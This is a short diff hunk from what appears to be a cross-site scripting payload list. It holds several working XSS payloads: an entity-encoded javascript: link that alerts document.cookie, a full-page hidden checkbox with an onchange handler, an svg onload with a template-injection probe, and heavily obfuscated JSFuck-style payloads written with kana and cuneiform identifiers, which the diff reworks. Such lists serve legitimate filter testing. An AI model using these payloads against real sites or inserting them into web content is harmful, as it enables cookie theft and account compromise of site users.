@@ -93,9 +93,4 @@ frames['alert'](document["cookie"])
 <a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">Click Here</a>
 <input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()"><label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
 '"--><svg/onload=top[30]()>${{4*9}}<script>+alert?.``</script>
-あ='',い=!あ+あ,う=!い+あ,え=あ+{},お=い[あ++],か=い[き=あ],
-く=++き+あ,け=え[き+く],
-い[け+=え[あ]+(い.う+え)[あ]+う[く]+お+か+い[き]+け+お+え[あ]+か][け](う[あ]+う[き]+い[く]+か+お+"('ハッキングされました')")()
-𒀱='',𒁍=!𒀱+𒀱,𒂖=!𒁍+𒀱,𒃵=𒀱+{},𒄿=𒁍[𒀱++],𒅗=𒁍[𒀲=𒀱],
-𒆜=++𒀲+𒀱,𒇻=𒃵[𒀲+𒆜],
-𒁍[𒇻+=𒃵[𒀱]+(𒁍.𒂖+𒃵)[𒀱]+𒂖[𒆜]+𒄿+𒅗+𒁍[𒀲]+𒇻+𒄿+𒃵[𒀱]+𒅗][𒇻](𒂖[𒀱]+𒂖[𒀲]+𒁍[𒆜]+𒅗+𒄿+"('𒀱𒀲𒀱𒋻𒆜𒀲𒁂𒐫𒉿𒀜𒅔')")()
+𒀱='',𒁍=!𒀱+𒀱,𒂖=!𒁍+𒀱,𒃵=𒀱+{},𒄿=𒁍[𒀱++],𒅗=𒁍[𒀲=𒀱],𒆜=++𒀲+𒀱,𒇻=𒃵[𒀲+𒆜],𒁍[𒇻+=𒃵[𒀱]+(𒁍.𒂖+𒃵)[𒀱]+𒂖[𒆜]+𒄿+𒅗+𒁍[𒀲]+𒇻+𒄿+𒃵[𒀱]+𒅗][𒇻](𒂖[𒀱]+𒂖[𒀲]+𒁍[𒆜]+𒅗+𒄿+"('𒀱𒀲𒀱𒋻𒆜𒀲𒁂𒐫𒉿𒀜𒅔')")()
